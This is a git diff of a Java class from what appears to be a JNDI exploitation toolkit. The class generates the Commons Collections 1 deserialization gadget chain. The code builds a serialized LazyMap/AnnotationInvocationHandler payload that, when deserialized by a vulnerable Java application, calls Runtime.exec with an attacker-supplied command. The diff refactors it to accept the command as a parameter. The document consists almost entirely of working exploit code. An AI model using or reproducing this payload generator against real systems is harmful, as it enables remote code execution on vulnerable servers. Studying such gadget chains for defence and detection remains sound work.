@@ -2,7 +2,9 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -16,35 +18,43 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections1 {
+/**
+ * 	Gadget chain:
+ * 		ObjectInputStream.readObject()
+ * 			AnnotationInvocationHandler.readObject()
+ * 				Map(Proxy).entrySet()
+ * 					AnnotationInvocationHandler.invoke()
+ * 						LazyMap.get()
+ * 							ChainedTransformer.transform()
+ * 								ConstantTransformer.transform()
+ * 								InvokerTransformer.transform()
+ * 									Method.invoke()
+ * 										Class.getMethod()
+ * 								InvokerTransformer.transform()
+ * 									Method.invoke()
+ * 										Runtime.getRuntime()
+ * 								InvokerTransformer.transform()
+ * 									Method.invoke()
+ * 										Runtime.exec()
+ *
+ * 	Requires:
+ * 		commons-collections
+ */
+public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        final String[] execArgs = new String[]{String.valueOf(type)};
-        // inert chain for setup
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{
-                        String.class, Class[].class}, new Object[]{
-                        "getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{
-                        Object.class, Object[].class}, new Object[]{
-                        null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class}, execArgs),
-                new ConstantTransformer(1)};
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
-        final Map innerMap = new HashMap();
+        final Map               innerMap = new HashMap();
+        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
+        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-
-        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
@@ -54,5 +64,14 @@ public class CommonsCollections1 {
         out.close();
 
         return bytes;
+    }
+
+    @Override
+    public InvocationHandler getObject(String command) throws Exception {
+        return null;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
